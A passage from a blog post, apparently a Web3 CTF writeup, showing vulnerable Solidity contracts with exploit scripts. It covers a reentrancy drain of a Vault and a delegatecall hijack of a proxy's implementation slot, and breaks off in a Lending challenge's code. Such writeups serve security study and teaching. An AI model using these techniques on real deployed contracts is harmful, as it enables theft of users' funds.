<!doctype html><html lang=en><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
         Statemind Web3 CTF 2025
        
    </title><meta content="Statemind Web3 CTF 2025" property=og:title><meta content="Known as TheMj0ln1r" property=og:description><meta content="Known as TheMj0ln1r" name=description><link href=/favicons/favicon.ico rel=icon type=image/png><link href=https://themj0ln1r.github.io/fonts.css rel=stylesheet><script src=https://themj0ln1r.github.io/js/codeblock.js></script><script src=https://themj0ln1r.github.io/js/toc.js></script><script src=https://themj0ln1r.github.io/js/note.js></script><script>MathJax = {
              tex: {
                inlineMath: [['$', '$'], ['\\(', '\\)']]
              }
            };</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><link title="Charan Nomula" href=https://themj0ln1r.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://themj0ln1r.github.io/theme/light.css rel=stylesheet><link href=https://themj0ln1r.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><script src=https://themj0ln1r.github.io/js/themetoggle.js></script><script>setTheme(getSavedTheme());</script><link href=https://themj0ln1r.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://themj0ln1r.github.io/>Charan Nomula</a><div class=socials><a class=social href=https://x.com/TheMj0ln1r/ rel=me target=_blank> <img alt=twitter src=https://themj0ln1r.github.io/social_icons/twitter.svg> </a><a class=social href=https://linkedin.com/in/mj0ln1r/ rel=me target=_blank> <img alt=linkedin src=https://themj0ln1r.github.io/social_icons/linkedin.svg> </a><a class=social href=https://github.com/TheMj0ln1r/ rel=me target=_blank> <img alt=github src=https://themj0ln1r.github.io/social_icons/github.svg> </a><a href="mailto: playermj0ln1r@gmail.com" class=social rel=me target=_blank> <img alt=Email src=https://themj0ln1r.github.io/social_icons/email.svg> </a></div></div><nav><a href=https://themj0ln1r.github.io/posts style=margin-left:.5em>/posts</a><a href=https://themj0ln1r.github.io/writeups style=margin-left:.5em>/writeups</a><a href=https://themj0ln1r.github.io/projects style=margin-left:.5em>/projects</a><a href=https://themj0ln1r.github.io/contact style=margin-left:.5em>/contact</a><a href=https://themj0ln1r.github.io/tags style=margin-left:.5em>/tags</a> |<a onclick="toggleTheme(); event.preventDefault();" href=# id=dark-mode-toggle> <img alt=Light id=sun-icon src=https://themj0ln1r.github.io/feather/sun.svg style=filter:invert()> <img alt=Dark id=moon-icon src=https://themj0ln1r.github.io/feather/moon.svg> </a><script>updateItemToggleTheme()</script></nav></header><main><article><div class=title><div class=page-header>Statemind Web3 CTF 2025<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2025-01-14</time><span class=tags-label> :: Tags:</span><span class=tags> <a class=post-tag href=https://themj0ln1r.github.io/tags/ctf/>ctf</a>, <a class=post-tag href=https://themj0ln1r.github.io/tags/blockchain/>blockchain</a>, <a class=post-tag href=https://themj0ln1r.github.io/tags/solidity/>solidity</a>, <a class=post-tag href=https://themj0ln1r.github.io/tags/bridge/>bridge</a>, <a class=post-tag href=https://themj0ln1r.github.io/tags/defi/>defi</a>, <a class=post-tag href=https://themj0ln1r.github.io/tags/huff/>Huff</a>, <a class=post-tag href=https://themj0ln1r.github.io/tags/evm/>evm</a> </span></div></div><div class=toc-container><h1 class=toc-title>Table of Contents</h1><ul class=toc-list><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#vault>Vault</a> <ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#solution>solution</a></ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#proxy>Proxy</a> <ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#solution-1>Solution</a></ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#lending>Lending</a> <ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#solution-2>Solution</a></ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#yeild>Yeild</a> <ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#solution-3>Solution</a></ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#oracle>Oracle</a> <ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#solution-4>Solution</a></ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#stablecoin>Stablecoin</a> <ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#solution-5>Solution</a></ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#bridge>Bridge</a> <ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#solution-6>Solution</a></li><ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#erc777>ERC777</a><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#attack>Attack</a></ul></ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#exchange>Exchange</a> <ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#solution-7>Solution</a></ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#fallout>Fallout</a> <ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#solution-8>Solution</a></li><ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#elliptic-curve-cryptography>Elliptic Curve Cryptography</a><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#ecdsa-signing-process>ECDSA Signing Process</a><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#ecdsa-verification-process>ECDSA Verification Process</a><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#attack-1>Attack</a></ul></ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#chef>Chef</a> <ul><li><a href=https://themj0ln1r.github.io/writeups/statemindctf25/#references>References</a></ul></ul></div><section class=body><p>Alpha content here... To keep up my security review skills, I participated in Statemind web3 security fellowship CTF focused on smart contract security of various concepts like,<ul><li>DeFi protocol vulnerabilities<li>Cross-chain bridge security<li>Oracle manipulation<li>Cryptographic implementations<li>Solidity and Vyper smart contracts<li>Huff programming</ul><p>I'm super excited to share my solutions and insights from this CTF, where I managed to secure a spot in the top 3! üèÜ Get ready for detailed writeups of each challenge - trust me, you won't want to miss these!<p>All of these challenges with solutions can be found here : <a href=https://github.com/TheMj0ln1r/statemind-web3-ctf>TheMj0ln1r/statemind-web3-ctf</a><h1 id=vault><a aria-label="Anchor link for: vault" class=zola-anchor href=#vault>Vault</a></h1><p>P: "Your goal is to drain all ether from the Vault contract. Use the deposit and withdraw functions to reduce the vault's balance to zero. Once the isSolved function returns true, you've completed the challenge."<div class=note-container><button class=note-toggle><div class=note-icon><p>Vault.sol</div></button><div class=note-content style=display:block><pre class=language-soliidty data-lang=soliidty style=color:#61676c;background-color:#fafafa><code class=language-soliidty data-lang=soliidty><span>// SPDX-License-Identifier: UNLICENSED
</span><span>pragma solidity ^0.6.12;
</span><span>pragma experimental ABIEncoderV2;
</span><span>
</span><span>contract Vault {
</span><span>    mapping(address => uint256) public balances;
</span><span>
</span><span>    address public player;
</span><span>
</span><span>    constructor(address _player) public payable {
</span><span>        player = _player;
</span><span>    }
</span><span>
</span><span>    function deposit(address _to) public payable {
</span><span>        balances[_to] += msg.value;
</span><span>    }
</span><span>
</span><span>    function withdraw(uint256 _amount) public {
</span><span>        if (balances[msg.sender] >= _amount) {
</span><span>            (bool success,) = msg.sender.call{value: _amount}("");
</span><span>            require(success, "call failed");
</span><span>            balances[msg.sender] -= _amount;
</span><span>        }
</span><span>    }
</span><span>
</span><span>    function balanceOf(address _who) public view returns (uint256 balance) {
</span><span>        return balances[_who];
</span><span>    }
</span><span>
</span><span>    function isSolved() external view returns (bool) {
</span><span>        return address(this).balance == 0;
</span><span>    }
</span><span>}
</span></code></pre></div></div><h2 id=solution><a aria-label="Anchor link for: solution" class=zola-anchor href=#solution>solution</a></h2><p>The vulnerability in this contract lies in the <code>withdraw</code> function, which is susceptible to a reentrancy attack. Here's why:<ol><li>The contract follows the checks-effects-interactions pattern incorrectly<li>The balance is updated after the external call<li>The contract uses a low-level <code>call</code> which forwards all gas</ol><p>Here's how I exploited it:<p>The exploit script uses a malicious contract (<code>Attack</code>) that implements a <code>receive()</code> function to recursively withdraw funds from the vault. When the vault sends ETH to our contract, the <code>receive()</code> function is triggered, allowing us to withdraw more funds before the vault updates its balance.<div class=note-container><button class=note-toggle><div class=note-icon><p>Vault.s.sol</div></button><div class=note-content style=display:block><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^0.6.0;
</span><span>
</span><span>import "forge-std/Script.sol";
</span><span>import "forge-std/console.sol";
</span><span>
</span><span>import {Vault} from "../src/Vault.sol";
</span><span>
</span><span>contract VaultSolve is Script {
</span><span>    Vault public vault = Vault(0x1B3C95A210A8C896b1C14D992600087668cd0174);
</span><span>    address player = vm.envAddress("PLAYER");
</span><span>
</span><span>
</span><span>    function run() external{
</span><span>        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
</span><span>        console.log("Vault : ", address(vault));
</span><span>        console.log("Vault balance: ", address(vault).balance);
</span><span>        console.log("Player : ", player);
</span><span>        console.log("Player balance: ", player.balance);
</span><span>        Attack attack = new Attack(address(vault));
</span><span>        console.log("Attack balance: ", address(attack).balance);
</span><span>
</span><span>        attack.exploit{value: 0.001 ether}();
</span><span>
</span><span>        console.log("Vault balance: ", address(vault).balance);
</span><span>        console.log("Attack balance: ", address(attack).balance);
</span><span>        console.log("Player balance: ", player.balance);
</span><span>
</span><span>
</span><span>        vm.stopBroadcast();
</span><span>    }
</span><span>}
</span><span>contract Attack{
</span><span>    Vault public vault;
</span><span>
</span><span>    constructor(address _vault) public {
</span><span>        vault = Vault(_vault);
</span><span>
</span><span>    }
</span><span>    function exploit() public payable{
</span><span>        vault.deposit{value: msg.value}(address(this));
</span><span>        vault.withdraw(0.001 ether);
</span><span>
</span><span>        // I need my testnet tokens back
</span><span>        msg.sender.call{value : address(this).balance}("");
</span><span>    }
</span><span>
</span><span>    receive() payable external{
</span><span>        if (address(vault).balance >= 0.001 ether){
</span><span>            vault.withdraw(0.001 ether);
</span><span>        }
</span><span>    }
</span><span>}
</span></code></pre></div></div><hr><h1 id=proxy><a aria-label="Anchor link for: proxy" class=zola-anchor href=#proxy>Proxy</a></h1><p>P: "You've encountered a proxy contract setup where the Proxy delegates calls to an Executor implementation. Find a way to manipulate the logic and get isSolved to return true."<div class=note-container><button class=note-toggle><div class=note-icon><p>Proxy.sol</div></button><div class=note-content style=display:block><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^0.8.0;
</span><span>
</span><span>import "@openzeppelin-contracts-4.8.0/contracts/utils/Address.sol"; 
</span><span>import "@openzeppelin-contracts-4.8.0/contracts/proxy/utils/Initializable.sol";
</span><span>
</span><span>contract Proxy {
</span><span>    // bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)
</span><span>    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
</span><span>    
</span><span>    struct AddressSlot {
</span><span>        address value;
</span><span>    }
</span><span>    
</span><span>    constructor(address _logic, address _player) {
</span><span>        require(Address.isContract(_logic), "implementation_not_contract");
</span><span>        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
</span><span>
</span><span>        (bool success,) = _logic.delegatecall(
</span><span>            abi.encodeWithSignature("initialize(address)", _player)
</span><span>        );
</span><span>
</span><span>        require(success, "call_failed");
</span><span>    }
</span><span>    function _delegate(address implementation) internal virtual {
</span><span>        // solhint-disable-next-line no-inline-assembly
</span><span>        assembly {
</span><span>            calldatacopy(0, 0, calldatasize())
</span><span>            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
</span><span>            returndatacopy(0, 0, returndatasize())
</span><span>            switch result
</span><span>            case 0 { revert(0, returndatasize()) }
</span><span>            default { return(0, returndatasize()) }
</span><span>        }
</span><span>    }
</span><span>    // proxy fallback
</span><span>    fallback() external payable virtual {
</span><span>        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
</span><span>    }
</span><span>    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
</span><span>        assembly {
</span><span>            r.slot := slot
</span><span>        }
</span><span>    }
</span><span>}
</span><span>contract Executor is Initializable {
</span><span>    address public owner;
</span><span>    address public player;
</span><span>
</span><span>    function initialize(address _player) external initializer {
</span><span>        owner = msg.sender;
</span><span>        player = _player;
</span><span>    }
</span><span>    modifier onlyOwner {
</span><span>        require(msg.sender == owner, "not_owner");
</span><span>        _;
</span><span>    }
</span><span>    function execute(address logic) external payable {
</span><span>        (bool success,) = logic.delegatecall(abi.encodeWithSignature("exec()"));
</span><span>        require(success, "call_fail");
</span><span>    }
</span><span>    function isSolved() external pure returns (bool) {
</span><span>        return false;
</span><span>    }
</span><span>}
</span></code></pre></div></div><h2 id=solution-1><a aria-label="Anchor link for: solution-1" class=zola-anchor href=#solution-1>Solution</a></h2><p>Okay, we got one vulnerable proxy implementation. This is a <code>delegatecall</code> based proxy pattern in which the Proxy contract holding the storage and logic is present in the Executor contract.<p>The goal is to manipulate the logic to make <code>isSolved()</code> return true. But If we observe that <code>isSolved()</code> function, it always returns <code>false</code> and it is hardcoded in the contract. So, that means we need to do complete upgrade of that contract and re-deploy in such a that it returns <code>true</code>.<p>The key vulnerability lies in the <code>execute()</code> function which uses <code>delegatecall</code> to execute arbitrary logic, allowing us to potentially manipulate the contract's state. Simply, the calls to Proxy contract is delegated to the Executor and the Executor is delegating to the <code>exec()</code> function of a arbitray Logic contract. So the context of the call (<code>msg.sender</code>, <code>msg.value</code>, <code>this</code> and storage) remains same inside the <code>exec()</code> function on Logic. So, If we can update the Executor address in the Proxy slot to a new contract which have the logic of returning <code>true</code> on calling <code>isSolved()</code> then the chall is done. This is what I did in the following exploit script.<div class=note-container><button class=note-toggle><div class=note-icon><p>Proxy.s.sol</div></button><div class=note-content style=display:block><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^0.8.0;
</span><span>
</span><span>import "forge-std/Script.sol";
</span><span>import "forge-std/console.sol";
</span><span>
</span><span>import {Proxy, Executor} from "../src/Proxy.sol";
</span><span>import "@openzeppelin-contracts-4.8.0/contracts/proxy/utils/Initializable.sol";
</span><span>
</span><span>contract ProxySolve is Script {
</span><span>    Proxy public proxy = Proxy(payable(0x09FAb0F0CC143875873F111A27DF77B6ade37a20));
</span><span>    Executor public executor = Executor(address(proxy));
</span><span>    address player = vm.envAddress("PLAYER");
</span><span>
</span><span>    // Deploy
</span><span>    // function setUp() external{
</span><span>    //     executor = new Executor();
</span><span>    //     proxy = new Proxy(address(executor), player);
</span><span>    //     executor = Executor(address(proxy));
</span><span>
</span><span>    //     vm.deal(player, 1 ether);
</span><span>    // }
</span><span>    function run() external{
</span><span>        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
</span><span>        console.log("Proxy : ", address(proxy));
</span><span>        bytes32 logic = vm.load(address(proxy), bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)));
</span><span>        console.log("logic in Proxy", address(uint160(uint256(logic))));
</span><span>        console.log("Proxy Owner: ", executor.owner());
</span><span>        console.log("Player in Proxy: ", executor.player());
</span><span>        console.log("Player : ", player);
</span><span>        console.log("Player balance: ", player.balance);
</span><span>        console.log("isSolved(): ", executor.isSolved());
</span><span>        NewExecutor newExecutor = new NewExecutor();
</span><span>        Attack attack = new Attack(address(address(newExecutor)), player);
</span><span>        executor.execute(address(attack));
</span><span>        console.log("Attack : ", address(attack));
</span><span>        console.log("NewExecutor : ", address(newExecutor));
</span><span>        logic = vm.load(address(proxy), bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)));
</span><span>        console.log("logic in Proxy", address(uint160(uint256(logic))));
</span><span>        // executor.initialize(player);
</span><span>        console.log("Proxy Owner: ", executor.owner());
</span><span>        console.log("Player in Proxy: ", executor.player());
</span><span>        console.log("isSolved(): ", executor.isSolved());
</span><span>        vm.stopBroadcast();
</span><span>    }
</span><span>}
</span><span>contract Attack {
</span><span>    struct AddressSlot {
</span><span>        address value;
</span><span>    }
</span><span>    address public owner;
</span><span>    address public player;
</span><span>    address immutable newExecutor;
</span><span>    address immutable playerplayer;
</span><span>    constructor(address _newExecutor, address _player){
</span><span>        newExecutor = _newExecutor;
</span><span>        playerplayer = _player;
</span><span>    }
</span><span>    function exec() external {
</span><span>        owner = address(0xdeadbeef);
</span><span>        player = playerplayer;
</span><span>        _getAddressSlot(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc).value = newExecutor;
</span><span>    }
</span><span>    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
</span><span>        assembly {
</span><span>            r.slot := slot
</span><span>        }
</span><span>    }
</span><span>}
</span><span>
</span><span>contract NewExecutor is Initializable{
</span><span>    address public owner;
</span><span>    address public player;
</span><span>    function initialize(address _player) external initializer {
</span><span>        owner = msg.sender;
</span><span>        player = _player;
</span><span>    }
</span><span>    function isSolved() external pure returns (bool) {
</span><span>        return true;
</span><span>    }
</span><span>}
</span></code></pre></div></div><hr><h1 id=lending><a aria-label="Anchor link for: lending" class=zola-anchor href=#lending>Lending</a></h1><p>P: "You have lending protocol that interacts with interesting pair. You need to steal all funds from lending protocol."<div class=note-container><button class=note-toggle><div class=note-icon><p>Lending.sol</div></button><div class=note-content style=display:block><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^0.8.0;
</span><span>
</span><span>import "@openzeppelin/contracts/utils/math/Math.sol";
</span><span>import "../helpers/ERC20.sol";
</span><span>
</span><span>contract Lending  {
</span><span>    ERC20 public collateralToken;
</span><span>    ERC20 public borrowToken;
</span><span>    Pair public pair;
</span><span>
</span><span>    mapping(address => uint256) public usersCollateral;
</span><span>    mapping(address => uint256) public usersUsedCollateral;
</span><span>    mapping(address => uint256) public usersBorrowed;
</span><span>
</span><span>    constructor(Pair _pair, ERC20 _collateralToken, ERC20 _borrowToken) {
</span><span>        collateralToken = _collateralToken;
</span><span>        pair = _pair;
</span><span>        borrowToken = _borrowToken;
</span><span>    }
</span><span>
</span><span>    function addCollateral(uint256 amount) external {
</span><span>        collateralToken.transferFrom(msg.sender, address(this), amount);
</span><span>        usersCollateral[msg.sender] += amount;
</span><span>    }
</span><span>
</span><span>    function removeCollateral(uint256 amount) external {
</span><span>        require(usersBorrowed[msg.sender] == 0, "You have debt");
</span><span>        require(usersCollateral[msg.sender] >= amount, "Not enough collateral");
</span><span>        collateralToken.transfer(msg.sender, amount);
</span><span>        usersCollateral[msg.sender] -= amount;
</span><span>    }
</span><span>
</span><span>    function borrow(uint256 _amount) external {
</span><span>        uint256 needCollateral = _amount * getExchangeRate() / 1e18;
</span><span>
</span><span>        require(needCollateral <= usersCollateral[msg.sender], "You don't have enough collateral");
</span><span>
</span><span>        borrowToken.transfer(msg.sender, _amount);
</span><span>        usersUsedCollateral[msg.sender] += needCollateral;
</span><span>        usersCollateral[msg.sender] -= needCollateral;
</span><span>        usersBorrowed[msg.sender] += _amount;
</span><span>    }
</span><span>
</span><span>    function repay(uint256 _amount) external {
</span><span>        uint256 collateral = (usersUsedCollateral[msg.sender] * _amount) / usersBorrowed[msg.sender];
</span><span>
</span><span>        borrowToken.transferFrom(msg.sender, address(this), _amount);
</span><span>
</span><span>        usersUsedCollateral[msg.sender] -= collateral;
</span><span>        usersCollateral[msg.sender] += collateral;
</span><span>        usersBorrowed[msg.sender] -= _amount;
</span><span>    }
</span><span>
</span><span>    function getExchangeRate() public view returns (uint256) {
</span><span>        return pair.getSpotPrice();
</span><span>    }
</span><span>
</span><span>    function isSolved() external view returns (bool) {
</span><span>        return borrowToken.balanceOf(address(this)) == 0;
</span><span>    }
</span><span>}
</span><span>
</span><span>library SafeMath {
</span><span>    function add(uint x, uint y) internal pure returns (uint z) {
</span><span>        require((z = x + y) >= x, 'ds-math-add-overflow');
</span><span>    }
</span><span>
</span><span>    function sub(uint x, uint y) internal pure returns (uint z) {
</span><span>        require((z = x - y) <= x, 'ds-math-sub-underflow');
</span><span>    }
</span><span>
</span><span>    function mul(uint x, uint y) internal pure returns (uint z) {
</span><span>        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');
</span><span>    }
</span><span>}
</span><span>
</span><span>library UQ112x112 {
</span><span>    uint224 constant Q112 = 2**112;
</span><span>
</span><span>    // encode a uint112 as a UQ112x112
</span><span>    function encode(uint112 y) internal pure returns (uint224 z) {
</span><span>        z = uint224(y) * Q112; // never overflows
</span><span>    }
</span><span>
</span><span>    // divide a UQ112x112 by a uint112, returning a UQ112x112
</span><span>    function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {
</span><span>        z = x / uint224(y);
</span><span>    }
</span><span>}
</span><span>
</span><span>interface IUniswapV2Callee {
</span><span>    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
</span><span>}
</span><span>
</span><span>
</span><span>contract Pair is ERC20 {
</span><span>    using SafeMath  for uint;
</span><span>    using UQ112x112 for uint224;
</span><span>
</span><span>    uint public constant MINIMUM_LIQUIDITY = 10**3;
</span><span>    bytes4 private constant SELECTOR = bytes4(keccak256(bytes('transfer(address,uint256)')));
</span><span>
</span><span>    address public factory;
</span><span>    address public token0;
</span><span>    address public token1;
</span><span>
</span><span>    uint112 private reserve0;           // uses single storage slot, accessible via getReserves
</span><span>    uint112 private reserve1;           // uses single storage slot, accessible via getReserves
</span><span>    uint32  private blockTimestampLast; // uses single storage slot, accessible via getReserves
</span><span>
</span><span>    uint public price0CumulativeLast;
</span><span>    uint public price1CumulativeLast;
</span><span>    uint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event
</span><span>
</span><span>    uint private unlocked = 1;
</span><span>    modifier lock() {
</span><span>        require(unlocked == 1, 'UniswapV2: LOCKED');
</span><span>        unlocked = 0;
</span><span>        _;
</span><span>        unlocked = 1;
</span><span>    }
</span><span>
</span><span>    function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) {
</span><span>        _reserve0 = reserve0;
</span><span>        _reserve1 = reserve1;
</span><span>        _blockTimestampLast = blockTimestampLast;
</span><span>    }
</span><span>
</span><span>    function getSpotPrice() external view returns (uint256) {
</span><span>        return Math.mulDiv(reserve1, 1e18, reserve0);
</span><span>    }
</span><span>
</span><span>    function _safeTransfer(address token, address to, uint value) private {
</span><span>        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));
</span><span>        require(success && (data.length == 0 || abi.decode(data, (bool))), 'UniswapV2: TRANSFER_FAILED');
</span><span>    }
</span><span>
</span><span>    event Mint(address indexed sender, uint amount0, uint amount1);
</span><span>    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
</span><span>    event Swap(
</span><span>        address indexed sender,
</span><span>        uint amount0In,
</span><span>        uint amount1In,
</span><span>        uint amount0Out,
</span><span>        uint amount1Out,
</span><span>        address indexed to
</span><span>    );
</span><span>    event Sync(uint112 reserve0, uint112 reserve1);
</span><span>
</span><span>    constructor() ERC20("ST", "ST") {
</span><span>        factory = msg.sender;
</span><span>    }
</span><span>
</span><span>    // called once by the factory at time of deployment
</span><span>    function initialize(address _token0, address _token1) external {
</span><span>        require(msg.sender == factory, 'UniswapV2: FORBIDDEN'); // sufficient check
</span><span>        token0 = _token0;
</span><span>        token1 = _token1;
</span><span>    }
</span><span>
</span><span>    // update reserves and, on the first call per block, price accumulators
</span><span>    function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private {
</span><span>        require(balance0 <= type(uint112).max && balance1 <= type(uint112).max, 'UniswapV2: OVERFLOW');
</span><span>        uint32 blockTimestamp = uint32(block.timestamp % 2**32);
</span><span>        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired
</span><span>        if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
</span><span>            // * never overflows, and + overflow is desired
</span><span>            price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;
</span><span>            price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;
</span><span>        }
</span><span>        reserve0 = uint112(balance0);
</span><span>        reserve1 = uint112(balance1);
</span><span>        blockTimestampLast = blockTimestamp;
</span><span>        emit Sync(reserve0, reserve1);
</span><span>    }
</span><span>
</span><span>    // if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k)
</span><span>    function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) {
</span><span>        address feeTo = address(0);
</span><span>        feeOn = feeTo != address(0);
</span><span>        uint _kLast = kLast; // gas savings
</span><span>        if (feeOn) {
</span><span>            if (_kLast != 0) {
</span><span>                uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));
</span><span>                uint rootKLast = Math.sqrt(_kLast);
</span><span>                if (rootK > rootKLast) {
</span><span>                    uint numerator = totalSupply.mul(rootK.sub(rootKLast));
</span><span>                    uint denominator = rootK.mul(5).add(rootKLast);
</span><span>                    uint liquidity = numerator / denominator;
</span><span>                    if (liquidity > 0) _mint(feeTo, liquidity);
</span><span>                }
</span><span>            }
</span><span>        } else if (_kLast != 0) {
</span><span>            kLast = 0;
</span><span>        }
</span><span>    }
</span><span>
</span><span>    // this low-level function should be called from a contract which performs important safety checks
</span><span>    function mint(address to) external lock returns (uint liquidity) {
</span><span>        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
</span><span>        uint balance0 = IERC20(token0).balanceOf(address(this));
</span><span>        uint balance1 = IERC20(token1).balanceOf(address(this));
</span><span>        uint amount0 = balance0.sub(_reserve0);
</span><span>        uint amount1 = balance1.sub(_reserve1);
</span><span>
</span><span>        bool feeOn = _mintFee(_reserve0, _reserve1);
</span><span>        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee
</span><span>        if (_totalSupply == 0) {
</span><span>            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);
</span><span>           _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens
</span><span>        } else {
</span><span>            liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);
</span><span>        }
</span><span>        require(liquidity > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED');
</span><span>        _mint(to, liquidity);
</span><span>
</span><span>        _update(balance0, balance1, _reserve0, _reserve1);
</span><span>        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date
</span><span>        emit Mint(msg.sender, amount0, amount1);
</span><span>    }
</span><span>
</span><span>    // this low-level function should be called from a contract which performs important safety checks
</span><span>    function burn(address to) external lock returns (uint amount0, uint amount1) {
</span><span>        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
</span><span>        address _token0 = token0;                                // gas savings
</span><span>        address _token1 = token1;                                // gas savings
</span><span>        uint balance0 = IERC20(_token0).balanceOf(address(this));
</span><span>        uint balance1 = IERC20(_token1).balanceOf(address(this));
</span><span>        uint liquidity = balanceOf[address(this)];
</span><span>
</span><span>        bool feeOn = _mintFee(_reserve0, _reserve1);
</span><span>        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee
</span><span>        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution
</span><span>        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution
</span><span>        require(amount0 > 0 && amount1 > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED');
</span><span>        _burn(address(this), liquidity);
</span><span>        _safeTransfer(_token0, to, amount0);
</span><span>        _safeTransfer(_token1, to, amount1);
</span><span>        balance0 = IERC20(_token0).balanceOf(address(this));
</span><span>        balance1 = IERC20(_token1).balanceOf(address(this));
</span><span>
</span><span>        _update(balance0, balance1, _reserve0, _reserve1);
</span><span>        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date
</span><span>        emit Burn(msg.sender, amount0, amount1, to);
</span><span>    }
</span><span>
</span><span>    // this low-level function should be called from a contract which performs important safety checks
</span><span>    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {
</span><span>        require(amount0Out > 0 || amount1Out > 0, 'UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT');
</span><span>        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
</span><span>        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'UniswapV2: INSUFFICIENT_LIQUIDITY');
</span><span>
</span><span>        uint balance0;
</span><span>        uint balance1;
</span><span>        { // scope for _token{0,1}, avoids stack too deep errors
</span><span>        address _token0 = token0;
</span><span>        address _token1 = token1;
</span><span>        require(to != _token0 && to != _token1, 'UniswapV2: INVALID_TO');
</span><span>        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
</span><span>        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens
</span><span>        if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);
